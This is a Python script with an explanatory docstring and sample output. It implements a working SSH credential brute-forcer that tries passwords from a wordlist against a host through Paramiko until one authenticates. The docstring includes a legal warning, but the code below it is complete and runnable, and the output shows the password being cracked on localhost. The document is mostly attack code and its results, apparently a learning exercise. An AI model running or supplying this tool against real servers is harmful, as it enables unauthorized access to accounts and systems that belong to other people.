'''
Short summary:
This Python script is a simple SSH credential-guessing tool. It reads candidate passwords from a file and attempts to authenticate to a specified SSH server for a given username using Paramiko.
It prints each attempt, reports success if a password authenticates, and stops after finding a working password or exhausting the list.

High-level flow:
Print a banner (SSH Brute Forcer) and set target parameters (host, username).
Open a password list file (common-passwords-win.txt) and iterate line by line.
For each password: increment an attempt counter and print the attempt info.
Create a Paramiko SSH client, accept unknown host keys automatically, and try to connect with the current password (5s timeout).
If authentication succeeds, report the found password, close the connection, and exit the loop.
Handle and report common exceptions (authentication failure, SSH protocol errors, and any other exceptions).
After the loop, print that the brute-force attack is completed.

What the key parts do (non-actionable):
with open(..., "r") as f: — reads candidate passwords from disk.
paramiko.SSHClient() and ssh.connect(...) — attempt to establish an SSH session using the supplied credentials.
except paramiko.AuthenticationException: — the script recognizes and reports failed logins.
break on success — stops further attempts once a credential works.

Important legal & ethical warning:
Using this script against systems you do not own or do not have explicit permission to test is illegal and unethical.
Brute-forcing credentials is a real attack technique; running it without authorization can cause criminal charges, civil liability,
and operational harm.

Paramiko : Paramiko is a pure-Python implementation of the SSHv2 protocol, offering both client and server functionalities.
'''
######################################################################################################################################################
from pwn import *
import paramiko

print("SSH Brute Forcer")
host = "127.0.0.1"
username = "s"
attempt_limit = 0
with open ("common-passwords-win.txt", "r") as f: # Open the password list file
    for line in f:
        password = line.strip()
        attempt_limit += 1
        print(f"Attempt {attempt_limit}: Trying password '{password}' for user '{username}'")
        try:
            ssh = paramiko.SSHClient() # Create SSH client
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Automatically add host keys
            ssh.connect(host, username=username, password=password, timeout=5) # Attempt to connect
            print(f"[+] Success! Password found: '{password}'") # If successful
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print("[-] Authentication failed.")
        except paramiko.SSHException as sshException:
            print(f"[-] Unable to establish SSH connection: {sshException}")
        except Exception as e:
            print(f"[-] Exception occurred: {e}")
print("Brute force attack completed.")

######################################################################################################################################################
Output : 
(pwntools-venv) s:~/pwntools-venv$ python3 ssh-brute.py 
SSH Brute Forcer
Attempt 1: Trying password 'aaa' for user 's'
[-] Authentication failed.
Attempt 2: Trying password 'abc' for user 's'
[-] Authentication failed.
Attempt 3: Trying password 'academia' for user 's'
[-] Authentication failed.
Attempt 4: Trying password 'academic' for user 's'
[-] Authentication failed.
Attempt 5: Trying password 'access' for user 's'
[-] Authentication failed.
Attempt 6: Trying password 'ada' for user 's'
[-] Authentication failed.
Attempt 7: Trying password 'admin' for user 's'
[-] Authentication failed.
Attempt 8: Trying password 'slater@987' for user 's'
[+] Success! Password found: 'slater@987'
Brute force attack completed.
            
            


